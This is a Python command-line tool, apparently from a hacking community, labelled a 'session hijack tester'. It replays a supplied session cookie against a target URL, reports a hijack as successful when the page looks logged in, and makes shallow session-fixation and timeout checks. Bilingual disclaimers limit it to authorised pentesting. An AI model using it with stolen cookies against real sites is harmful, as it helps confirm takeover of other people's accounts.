#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  SESSION HIJACK TESTER v2.0                                      ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Authentication Attacks                    ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
import argparse
import time

colorama.init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║{Fore.CYAN}  ███████╗██╗   ██╗███╗   ██╗ ██████╗██████╗  █████╗  ██████╗██╗  {Fore.RED}║
║{Fore.CYAN}  ██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  {Fore.RED}║
║{Fore.CYAN}  ███████╗ ╚████╔╝ ██╔██╗ ██║██║     ██████╔╝███████║██║     ██║  {Fore.RED}║
║{Fore.CYAN}  ╚════██║  ╚██╔╝  ██║╚██╗██║██║     ██╔══██╗██╔══██║██║     ██║  {Fore.RED}║
║{Fore.CYAN}  ███████║   ██║   ██║ ╚████║╚██████╗██║  ██║██║  ██║╚██████╗███████{Fore.RED}║
║{Fore.CYAN}  ╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════{Fore.RED}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.YELLOW}  HELL SOCIETY - Session Hijack Tester v2.0                           {Fore.RED}║
╚══════════════════════════════════════════════════════════════════╝
"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

class SessionHijackTester:
    def __init__(self, target, cookie_value):
        self.target = target.rstrip('/')
        self.cookie_value = cookie_value
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def test_session(self):
        print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{self.target}")
        print(f"{Fore.CYAN}  [*] Session cookie: {Fore.WHITE}{self.cookie_value[:30]}...\n")

        # Test with session cookie
        cookie_name = 'session'
        if '=' in self.cookie_value:
            cookie_name, cookie_val = self.cookie_value.split('=', 1)
        else:
            cookie_val = self.cookie_value

        self.session.cookies.set(cookie_name, cookie_val)

        try:
            resp = self.session.get(self.target, timeout=10)

            if resp.status_code == 200:
                if 'logout' in resp.text.lower() or 'dashboard' in resp.text.lower():
                    print(f"  {Fore.GREEN}[+] Session hijack SUCCESSFUL!")
                    print(f"  {Fore.GREEN}  Session is valid - user is authenticated")
                    self.vulns.append('Session Valid - Hijack Possible')
                else:
                    print(f"  {Fore.YELLOW}  [-] Session may not be valid")

            if resp.status_code == 403:
                print(f"  {Fore.YELLOW}  [-] Access denied - session may be expired")

            # Test session fixation
            self._test_fixation()

            # Test session timeout
            self._test_timeout()

        except Exception as e:
            print(f"{Fore.RED}  [!] Error: {e}")

    def _test_fixation(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  SESSION FIXATION TEST")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Check if session ID changes after login
        login_pages = ['/login', '/auth/login', '/signin', '/api/auth/login']
        for page in login_pages:
            url = f"{self.target}{page}"
            try:
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200:
                    print(f"  {Fore.YELLOW}  Login page found: {page}")
                    print(f"  {Fore.YELLOW}  Verify if session ID changes after authentication")
                    break
            except:
                pass

    def _test_timeout(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  SESSION TIMEOUT TEST")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        print(f"  {Fore.YELLOW}  Testing session persistence...")

        requests_made = 0
        for i in range(5):
            try:
                resp = self.session.get(self.target, timeout=10)
                requests_made += 1
                time.sleep(2)
            except:
                break

        print(f"  {Fore.CYAN}  Requests made with same session: {requests_made}")

        if requests_made == 5:
            print(f"  {Fore.GREEN}[OK] Session persists across multiple requests")

    def print_results(self):
        print(f"\n{Fore.CYAN}  {'═' * 60}")
        print(f"{Fore.CYAN}  SUMMARY:")
        print(f"{Fore.CYAN}  {'═' * 60}")

        if self.vulns:
            print(f"  {Fore.RED}[!] Vulnerabilities: {len(self.vulns)}")
            for v in self.vulns:
                print(f"    {Fore.RED}• {v}")
        else:
            print(f"  {Fore.GREEN}[OK] No session vulnerabilities detected")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society Session Hijack Tester')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-c', '--cookie', required=True, help='Session cookie value')
    args = parser.parse_args()

    tester = SessionHijackTester(args.url, args.cookie)
    tester.test_session()
    tester.print_results()

if __name__ == "__main__":
    main()
